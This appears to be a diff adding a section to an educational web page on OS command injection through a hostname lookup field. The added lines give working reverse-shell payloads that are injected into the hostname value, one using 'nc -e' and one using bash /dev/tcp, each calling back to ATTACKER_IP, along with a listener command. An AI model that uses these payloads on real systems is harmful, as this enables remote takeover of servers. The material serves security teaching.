@@ -34,6 +34,24 @@
       substitutes its output directly into the "hostname" being looked up.</li>
 </ol>
 <p>
+  A single command's output is a proof-of-concept. A real attacker escalates to a
+  persistent, interactive foothold instead:
+</p>
+<ol>
+  <li>Start a listener on your own machine:
+      <code>nc -lvnp 4444</code></li>
+  <li>Submit this as the hostname (the trailing <code>&amp;</code> backgrounds the reverse
+      shell so the request itself returns immediately, instead of hanging until this
+      route's 10-second timeout kills it):
+      <br>
+      <code>localhost; nc -e /bin/sh ATTACKER_IP 4444 &amp;</code></li>
+  <li>Your listener now has an interactive shell on the target. If the target doesn't have
+      <code>nc -e</code> compiled in, bash's own <code>/dev/tcp</code> feature works
+      identically with no extra tools required:
+      <br>
+      <code>localhost; bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1' &amp;</code></li>
+</ol>
+<p>
   OS command injection is consistently rated among the most severe web vulnerabilities
   because a successful exploit doesn't just leak data — it hands the attacker arbitrary
   code execution on the server itself, at whatever privilege level the app process runs
